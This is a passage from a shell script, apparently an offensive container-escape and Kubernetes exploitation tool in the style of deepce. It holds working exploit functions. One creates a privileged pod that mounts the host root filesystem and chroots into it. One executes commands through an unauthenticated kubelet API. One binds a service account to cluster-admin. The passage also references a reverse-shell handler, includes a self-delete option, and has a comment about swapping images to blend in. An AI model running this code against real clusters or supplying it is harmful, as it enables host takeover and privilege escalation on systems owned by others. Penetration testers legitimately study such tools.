  printSuccess "Check your reverse shell handler!"

}

exploitK8sPrivilegedPod() {
  printSection "Exploiting K8s: Privileged Pod"
  printTip "$TIP_K8S_CREATE_PODS"

  if ! [ -x "$(command -v curl)" ]; then
    printInstallAdvice "curl"
    exit 1
  fi

  saToken="${k8sToken:-$SA_TOKEN_PATH}"
  if ! [ -f "$saToken" ] || ! [ -r "$saToken" ]; then
    printError "SA token not found at $saToken"
    exit 1
  fi

  if ! [ "$k8sAPI" ]; then
    if [ "$KUBERNETES_SERVICE_HOST" ]; then
      k8sPort="${KUBERNETES_SERVICE_PORT:-443}"
      k8sAPI="https://${KUBERNETES_SERVICE_HOST}:${k8sPort}"
    else
      printError "Cannot determine API server URL. Set KUBERNETES_SERVICE_HOST or use --k8s-api"
      exit 1
    fi
  fi

  tokenData=$(cat "$saToken")
  ns="${k8sNamespace:-default}"
  podName="deepce-$(tr -dc 'a-z0-9' </dev/urandom 2>/dev/null | head -c 8)"

  prepareExploit

  printMsg "Pod name ................." "$podName"
  printMsg "Namespace ................" "$ns"
  printMsg "API server ..............." "$k8sAPI"

  # Pod spec: privileged, hostPID, hostNetwork, hostPath / mount
  # [MALLEABLE] swap image for one already pulled on target nodes (check node image list first)
  podSpec="{
    \"apiVersion\": \"v1\",
    \"kind\": \"Pod\",
    \"metadata\": {\"name\": \"$podName\", \"namespace\": \"$ns\"},
    \"spec\": {
      \"hostPID\": true,
      \"hostNetwork\": true,
      \"restartPolicy\": \"Never\",
      \"containers\": [{
        \"name\": \"pwn\",
        \"image\": \"alpine\",
        \"securityContext\": {\"privileged\": true},
        \"command\": [\"/bin/sh\", \"-c\", \"chroot /host sh -c \\\"$cmd\\\"\"],
        \"volumeMounts\": [{\"name\": \"host\", \"mountPath\": \"/host\"}]
      }],
      \"volumes\": [{\"name\": \"host\", \"hostPath\": {\"path\": \"/\"}}]
    }
  }"

  printQuestion "Creating privileged pod ."
  # shellcheck disable=SC2086
  createResp=$(curl -s $curl_ca --connect-timeout 10 \
    -X POST \
    -H "Authorization: Bearer $tokenData" \
    -H "Content-Type: application/json" \
    -d "$podSpec" \
    "$k8sAPI/api/v1/namespaces/$ns/pods" 2>/dev/null)

  if echo "$createResp" | grep -q '"phase"\|"pending"\|"name":"'"$podName"'"'; then
    printSuccess "Pod created: $podName"
  else
    printError "Pod creation failed"
    printStatus "$createResp"
    exit 1
  fi

  printMsg "Waiting for pod ........" "5s"
  sleep 5

  # Exec into pod via API (requires exec permissions too, fall back to logs for one-shot cmds)
  printQuestion "Fetching command output .."
  # shellcheck disable=SC2086
  logResp=$(curl -s $curl_ca --connect-timeout 10 \
    -H "Authorization: Bearer $tokenData" \
    "$k8sAPI/api/v1/namespaces/$ns/pods/$podName/log" 2>/dev/null)
  if [ "$logResp" ]; then
    printSuccess "Output:"
    printStatus "$logResp"
  else
    printError "No output yet — pod may still be pulling image"
    printStatus "Check: kubectl logs -n $ns $podName"
  fi

  # Cleanup
  printQuestion "Deleting pod ............"
  # shellcheck disable=SC2086
  curl -s $curl_ca -X DELETE \
    -H "Authorization: Bearer $tokenData" \
    "$k8sAPI/api/v1/namespaces/$ns/pods/$podName" >/dev/null 2>&1
  printSuccess "Done"
}

exploitKubeletExec() {
  printSection "Exploiting K8s: Kubelet Exec"
  printTip "$TIP_K8S_KUBELET"

  if ! [ -x "$(command -v curl)" ]; then
    printInstallAdvice "curl"
    exit 1
  fi

  nodeIP="${NODE_IP:-$(hostname -i 2>/dev/null | cut -d' ' -f1)}"
  if ! [ "$nodeIP" ]; then
    printError "Cannot determine node IP. Set NODE_IP env var."
    exit 1
  fi

  prepareExploit

  # List pods to pick a target in kube-system (highest privilege)
  printQuestion "Listing pods on node ...."
  podListResp=$(curl -sk --connect-timeout 5 "https://${nodeIP}:10250/pods" 2>/dev/null)
  if ! echo "$podListResp" | grep -q '"kind"'; then
    printError "Kubelet API not accessible without auth on port 10250"
    exit 1
  fi

  # Try to find a kube-system pod for elevated execution; fall back to first pod
  targetNs=$(echo "$podListResp" | grep -o '"namespace":"kube-system"' | head -1 | cut -d'"' -f4)
  if ! [ "$targetNs" ]; then
    targetNs=$(echo "$podListResp" | grep -o '"namespace":"[^"]*' | head -1 | cut -d'"' -f4)
  fi
  targetPod=$(echo "$podListResp" | grep -o '"name":"[^"]*' | grep -v "metadata\|namespace" | head -1 | cut -d'"' -f4)
  targetContainer=$(echo "$podListResp" | grep -o '"name":"[^"]*' | grep -v "metadata\|namespace\|pod" | head -1 | cut -d'"' -f4)

  printMsg "Target namespace ........." "$targetNs"
  printMsg "Target pod ..............." "$targetPod"
  printMsg "Target container ........." "$targetContainer"

  if ! [ "$targetPod" ] || ! [ "$targetContainer" ]; then
    printError "Could not identify target pod/container from kubelet response"
    exit 1
  fi

  printQuestion "Executing command ......."
  # shellcheck disable=SC2086
  execResp=$(curl -sk --connect-timeout 10 \
    -X POST \
    "https://${nodeIP}:10250/run/${targetNs}/${targetPod}/${targetContainer}" \
    --data-urlencode "cmd=$cmd" 2>/dev/null)
  if [ "$execResp" ]; then
    printSuccess "Output:"
    printStatus "$execResp"
  else
    printError "No response from kubelet exec endpoint"
  fi
}

exploitK8sTokenPrivEsc() {
  printSection "Exploiting K8s: Token Privilege Escalation"

  if ! [ -x "$(command -v curl)" ]; then
    printInstallAdvice "curl"
    exit 1
  fi

  saToken="${k8sToken:-$SA_TOKEN_PATH}"
  if ! [ -f "$saToken" ] || ! [ -r "$saToken" ]; then
    printError "SA token not found"
    exit 1
  fi

  if ! [ "$k8sAPI" ]; then
    if [ "$KUBERNETES_SERVICE_HOST" ]; then
      k8sPort="${KUBERNETES_SERVICE_PORT:-443}"
      k8sAPI="https://${KUBERNETES_SERVICE_HOST}:${k8sPort}"
    else
      printError "Cannot determine API server URL"
      exit 1
    fi
  fi

  tokenData=$(cat "$saToken")
  ns="${k8sNamespace:-default}"

  # Bind current SA to cluster-admin via ClusterRoleBinding
  bindingName="deepce-escalate-$(tr -dc 'a-z0-9' </dev/urandom 2>/dev/null | head -c 6)"
  currentSA=$(grep -o '"sub":"[^"]*' "$saToken" 2>/dev/null | cut -d'"' -f4 || echo "system:serviceaccount:$ns:default")

  printMsg "Escalation target ......." "$currentSA"
  printMsg "Binding name ............" "$bindingName"

  bindingSpec="{
    \"apiVersion\": \"rbac.authorization.k8s.io/v1\",
    \"kind\": \"ClusterRoleBinding\",
    \"metadata\": {\"name\": \"$bindingName\"},
    \"roleRef\": {\"apiGroup\": \"rbac.authorization.k8s.io\", \"kind\": \"ClusterRole\", \"name\": \"cluster-admin\"},
    \"subjects\": [{\"kind\": \"ServiceAccount\", \"name\": \"default\", \"namespace\": \"$ns\"}]
  }"

  printQuestion "Binding to cluster-admin ."
  # shellcheck disable=SC2086
  bindResp=$(curl -s $curl_ca --connect-timeout 10 \
    -X POST \
    -H "Authorization: Bearer $tokenData" \
    -H "Content-Type: application/json" \
    -d "$bindingSpec" \
    "$k8sAPI/apis/rbac.authorization.k8s.io/v1/clusterrolebindings" 2>/dev/null)

  if echo "$bindResp" | grep -q '"name":"'"$bindingName"'"'; then
    printYesEx
    printStatus "Cluster-admin binding created: $bindingName"
    printStatus "You now have cluster-admin. Clean up: kubectl delete clusterrolebinding $bindingName"
  else
    printError "Binding failed"
    printStatus "$bindResp"
  fi
}

###########################################
#--------------) Arg Parse (--------------#
###########################################

while [ $# -gt 0 ]; do
  key="$1"
  case $key in
  -h | --help)
    show_help
    exit 0
    ;;
  -ne | --no-enumeration | --no-enum | --no-enumerate)
    skipEnum="1"
    shift
    ;;
  -nn | --no-network | --no-net)
    noNetwork="1"
    shift
    ;;
  -nc | --no-cols | --no-colors | --no-colours)
    unsetColors
    shift
    ;;
  -q | --quiet)
    quiet="1"
    shift
    ;;
  -e | -ex | --exploit)
    exploit="$2"
    shift
    shift
    ;;
  -l | --listen)
    listen="1"
    shift
    ;;
  --user|--username)
    username="$2"
    shift
    shift
    ;;
  -cmd | --command)
    command="$2"
    shift
    shift
    ;;
  --pass|--password)
    password="$2"
    shift
    shift
    ;;
  -s | --shadow)
    shadow="1"
    shift
    ;;
  -i | --ip)
    ip="$2"
    shift
    shift
    ;;
  -p | --port)
    port="$2"
    shift
    shift
    ;;
  --install)
    install="1"
    shift
    ;;
  -doc | --delete | --delete-on-complete)
    delete="1"
    shift
    ;;
  -k | --kubernetes | --k8s)
    forceKubernetes="1"
    shift
    ;;
  -km | --k8s-metadata | --metadata)
    k8sCheckMetadata="1"
    shift
    ;;
  -ke | --k8s-exploit)
    k8sExploit="1"
    shift
    ;;
  --token)
    k8sToken="$2"
    shift
    shift
    ;;
  --k8s-api)
    k8sAPIOverride="$2"
    shift
    shift
    ;;
  *)
    echo "Unknown option $1"
    exit 1
    ;;
  esac
done

###########################################
#--------------) Execution (--------------#
###########################################

banner
describeColors
installPackages

if ! [ "$skipEnum" ]; then

  printSection "Enumerating Platform"
  containerCheck

  printQuestion "Inside Container ........"

  if [ "$inContainer" ]; then
    # Inside Container
    printYes
    containerType
    getContainerRuntime
    containerTools
    userCheck

    if [ "$containerType" = "docker" ]; then
      getDockerVersion
      dockerSockCheck
      checkDockerVersionExploits
    fi

    # runc and kernel checks apply in all container types
    checkRuncVersionExploits
    checkKernelVersionExploits

    enumerateContainer
    findMountedFolders
    findInterestingFiles

    if [ "$containerType" = "kubernetes" ]; then
      enumerateKubernetes
    elif [ "$forceKubernetes" ]; then
      enumerateKubernetes
    fi

    # Always check cloud metadata if flag set
    if [ "$k8sCheckMetadata" ] && [ "$containerType" != "kubernetes" ]; then
      checkCloudMetadata
    fi

    enumerateContainers
  else
    # Outside Container
    printNo
    userCheck
    containerTools
    getDockerVersion
    dockerSockCheck
    checkDockerVersionExploits
    checkRuncVersionExploits
    checkKernelVersionExploits
    enumerateContainers
  fi
fi

# Parse exploit argument
if [ "$exploit" ]; then
  case $exploit in
  docker | DOCKER)
    exploitDocker
    ;;
  priv | PRIV | privileged | PRIVILEGED)
    exploitPrivileged
    ;;
  sock | SOCK)
    exploitDockerSock
    ;;
  sys | SYS | sys_module | SYS_MODULE)
    exploitSysModule
    ;;
  k8s_pod | K8S_POD | k8spod)
    exploitK8sPrivilegedPod
    ;;
  k8s_kubelet | K8S_KUBELET | kubelet)
    exploitKubeletExec
    ;;
  k8s_escalate | K8S_ESCALATE | k8s_privesc)
    exploitK8sTokenPrivEsc
    ;;
  *)
    echo "Unknown exploit $1"
    exit 1
    ;;
  esac
fi

printSection ""


if [ "$delete" ]; then
  rm -- "$0"
fi

exit 0
